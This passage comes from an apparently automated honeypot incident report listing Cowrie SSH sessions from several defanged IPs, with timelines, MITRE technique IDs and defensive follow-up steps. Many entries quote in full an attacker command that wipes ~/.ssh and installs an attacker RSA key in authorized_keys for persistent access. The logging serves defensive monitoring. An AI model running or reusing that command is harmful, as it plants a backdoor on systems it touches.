**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:00:08` | `cowrie.session.connect` |
| `2026-04-20 20:00:08` | `cowrie.client.version` |
| `2026-04-20 20:00:08` | `cowrie.client.kex` |
| `2026-04-20 20:00:09` | `cowrie.login.success` |
| `2026-04-20 20:00:09` | `cowrie.session.params` |
| `2026-04-20 20:00:09` | `cowrie.command.input` |
| `2026-04-20 20:00:09` | `cowrie.command.failed` |
| `2026-04-20 20:00:09` | `cowrie.log.closed` |
| `2026-04-20 20:00:10` | `cowrie.session.params` |
| `2026-04-20 20:00:10` | `cowrie.command.input` |
| `2026-04-20 20:00:10` | `cowrie.session.file_download` |
| `2026-04-20 20:00:10` | `cowrie.log.closed` |
| `2026-04-20 20:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d25acea5d2a5

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:00 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:00:11` | `cowrie.session.connect` |
| `2026-04-20 20:00:11` | `cowrie.client.version` |
| `2026-04-20 20:00:11` | `cowrie.client.kex` |
| `2026-04-20 20:00:12` | `cowrie.login.success` |
| `2026-04-20 20:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53627dc418da

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:00 |
| **Last Seen** | 2026-04-20 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:00:12` | `cowrie.session.connect` |
| `2026-04-20 20:00:12` | `cowrie.client.version` |
| `2026-04-20 20:00:12` | `cowrie.client.kex` |
| `2026-04-20 20:00:13` | `cowrie.login.success` |
| `2026-04-20 20:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866ae1e4289d

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:21` | `cowrie.session.connect` |
| `2026-04-20 20:01:21` | `cowrie.client.version` |
| `2026-04-20 20:01:22` | `cowrie.client.kex` |
| `2026-04-20 20:01:23` | `cowrie.login.success` |
| `2026-04-20 20:01:24` | `cowrie.session.params` |
| `2026-04-20 20:01:24` | `cowrie.command.input` |
| `2026-04-20 20:01:24` | `cowrie.command.failed` |
| `2026-04-20 20:01:24` | `cowrie.log.closed` |
| `2026-04-20 20:01:25` | `cowrie.session.params` |
| `2026-04-20 20:01:25` | `cowrie.command.input` |
| `2026-04-20 20:01:25` | `cowrie.session.file_download` |
| `2026-04-20 20:01:25` | `cowrie.log.closed` |
| `2026-04-20 20:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760146526f91

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:30` | `cowrie.session.connect` |
| `2026-04-20 20:01:30` | `cowrie.client.version` |
| `2026-04-20 20:01:30` | `cowrie.client.kex` |
| `2026-04-20 20:01:30` | `cowrie.login.success` |
| `2026-04-20 20:01:31` | `cowrie.session.params` |
| `2026-04-20 20:01:31` | `cowrie.command.input` |
| `2026-04-20 20:01:31` | `cowrie.command.failed` |
| `2026-04-20 20:01:31` | `cowrie.log.closed` |
| `2026-04-20 20:01:31` | `cowrie.session.params` |
| `2026-04-20 20:01:31` | `cowrie.command.input` |
| `2026-04-20 20:01:31` | `cowrie.session.file_download` |
| `2026-04-20 20:01:31` | `cowrie.log.closed` |
| `2026-04-20 20:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c1cd1e3fd8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:30` | `cowrie.session.connect` |
| `2026-04-20 20:01:30` | `cowrie.client.version` |
| `2026-04-20 20:01:30` | `cowrie.client.kex` |
| `2026-04-20 20:01:31` | `cowrie.login.success` |
| `2026-04-20 20:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b719773a9fb8

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:33` | `cowrie.session.connect` |
| `2026-04-20 20:01:33` | `cowrie.client.version` |
| `2026-04-20 20:01:33` | `cowrie.client.kex` |
| `2026-04-20 20:01:34` | `cowrie.login.success` |
| `2026-04-20 20:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e474a3ec2a9d

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:46` | `cowrie.session.connect` |
| `2026-04-20 20:01:46` | `cowrie.client.version` |
| `2026-04-20 20:01:46` | `cowrie.client.kex` |
| `2026-04-20 20:01:47` | `cowrie.login.success` |
| `2026-04-20 20:01:48` | `cowrie.session.params` |
| `2026-04-20 20:01:48` | `cowrie.command.input` |
| `2026-04-20 20:01:48` | `cowrie.command.failed` |
| `2026-04-20 20:01:48` | `cowrie.log.closed` |
| `2026-04-20 20:01:49` | `cowrie.session.params` |
| `2026-04-20 20:01:49` | `cowrie.command.input` |
| `2026-04-20 20:01:49` | `cowrie.session.file_download` |
| `2026-04-20 20:01:49` | `cowrie.log.closed` |
| `2026-04-20 20:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0d5654df3f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:51` | `cowrie.session.connect` |
| `2026-04-20 20:01:51` | `cowrie.client.version` |
| `2026-04-20 20:01:51` | `cowrie.client.kex` |
| `2026-04-20 20:01:51` | `cowrie.login.success` |
| `2026-04-20 20:01:52` | `cowrie.session.params` |
| `2026-04-20 20:01:52` | `cowrie.command.input` |
| `2026-04-20 20:01:52` | `cowrie.command.failed` |
| `2026-04-20 20:01:52` | `cowrie.log.closed` |
| `2026-04-20 20:01:52` | `cowrie.session.params` |
| `2026-04-20 20:01:52` | `cowrie.command.input` |
| `2026-04-20 20:01:52` | `cowrie.session.file_download` |
| `2026-04-20 20:01:52` | `cowrie.log.closed` |
| `2026-04-20 20:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab53992bdb38

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:52` | `cowrie.session.connect` |
| `2026-04-20 20:01:52` | `cowrie.client.version` |
| `2026-04-20 20:01:52` | `cowrie.client.kex` |
| `2026-04-20 20:01:53` | `cowrie.login.success` |
| `2026-04-20 20:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f82cb5a3876

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:01 |
| **Last Seen** | 2026-04-20 20:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:01:54` | `cowrie.session.connect` |
| `2026-04-20 20:01:54` | `cowrie.client.version` |
| `2026-04-20 20:01:54` | `cowrie.client.kex` |
| `2026-04-20 20:01:54` | `cowrie.login.success` |
| `2026-04-20 20:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02359eef309e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:02 |
| **Last Seen** | 2026-04-20 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:02:16` | `cowrie.session.connect` |
| `2026-04-20 20:02:16` | `cowrie.client.version` |
| `2026-04-20 20:02:16` | `cowrie.client.kex` |
| `2026-04-20 20:02:17` | `cowrie.login.success` |
| `2026-04-20 20:02:17` | `cowrie.session.params` |
| `2026-04-20 20:02:17` | `cowrie.command.input` |
| `2026-04-20 20:02:17` | `cowrie.command.failed` |
| `2026-04-20 20:02:17` | `cowrie.log.closed` |
| `2026-04-20 20:02:18` | `cowrie.session.params` |
| `2026-04-20 20:02:18` | `cowrie.command.input` |
| `2026-04-20 20:02:18` | `cowrie.session.file_download` |
| `2026-04-20 20:02:18` | `cowrie.log.closed` |
| `2026-04-20 20:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10cc936c9a0b

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:02 |
| **Last Seen** | 2026-04-20 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:02:20` | `cowrie.session.connect` |
| `2026-04-20 20:02:20` | `cowrie.client.version` |
| `2026-04-20 20:02:20` | `cowrie.client.kex` |
| `2026-04-20 20:02:20` | `cowrie.login.success` |
| `2026-04-20 20:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6948ba854b9d

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:02 |
| **Last Seen** | 2026-04-20 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:02:28` | `cowrie.session.connect` |
| `2026-04-20 20:02:28` | `cowrie.client.version` |
| `2026-04-20 20:02:28` | `cowrie.client.kex` |
| `2026-04-20 20:02:29` | `cowrie.login.success` |
| `2026-04-20 20:02:29` | `cowrie.session.params` |
| `2026-04-20 20:02:29` | `cowrie.command.input` |
| `2026-04-20 20:02:29` | `cowrie.command.failed` |
| `2026-04-20 20:02:29` | `cowrie.log.closed` |
| `2026-04-20 20:02:29` | `cowrie.session.params` |
| `2026-04-20 20:02:29` | `cowrie.command.input` |
| `2026-04-20 20:02:30` | `cowrie.session.file_download` |
| `2026-04-20 20:02:30` | `cowrie.log.closed` |
| `2026-04-20 20:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92afaa0f4b1d

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:02 |
| **Last Seen** | 2026-04-20 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:02:32` | `cowrie.session.connect` |
| `2026-04-20 20:02:32` | `cowrie.client.version` |
| `2026-04-20 20:02:32` | `cowrie.client.kex` |
| `2026-04-20 20:02:32` | `cowrie.login.success` |
| `2026-04-20 20:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d05ff84467

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:09` | `cowrie.session.connect` |
| `2026-04-20 20:03:09` | `cowrie.client.version` |
| `2026-04-20 20:03:09` | `cowrie.client.kex` |
| `2026-04-20 20:03:11` | `cowrie.login.success` |
| `2026-04-20 20:03:12` | `cowrie.session.params` |
| `2026-04-20 20:03:12` | `cowrie.command.input` |
| `2026-04-20 20:03:12` | `cowrie.command.failed` |
| `2026-04-20 20:03:12` | `cowrie.log.closed` |
| `2026-04-20 20:03:13` | `cowrie.session.params` |
| `2026-04-20 20:03:13` | `cowrie.command.input` |
| `2026-04-20 20:03:13` | `cowrie.session.file_download` |
| `2026-04-20 20:03:13` | `cowrie.log.closed` |
| `2026-04-20 20:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e524e32dc4f8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:17` | `cowrie.session.connect` |
| `2026-04-20 20:03:17` | `cowrie.client.version` |
| `2026-04-20 20:03:18` | `cowrie.client.kex` |
| `2026-04-20 20:03:19` | `cowrie.login.success` |
| `2026-04-20 20:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae637fc41f0

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:31` | `cowrie.session.connect` |
| `2026-04-20 20:03:31` | `cowrie.client.version` |
| `2026-04-20 20:03:32` | `cowrie.client.kex` |
| `2026-04-20 20:03:32` | `cowrie.login.success` |
| `2026-04-20 20:03:32` | `cowrie.session.params` |
| `2026-04-20 20:03:32` | `cowrie.command.input` |
| `2026-04-20 20:03:32` | `cowrie.command.failed` |
| `2026-04-20 20:03:33` | `cowrie.log.closed` |
| `2026-04-20 20:03:33` | `cowrie.session.params` |
| `2026-04-20 20:03:33` | `cowrie.command.input` |
| `2026-04-20 20:03:33` | `cowrie.session.file_download` |
| `2026-04-20 20:03:33` | `cowrie.log.closed` |
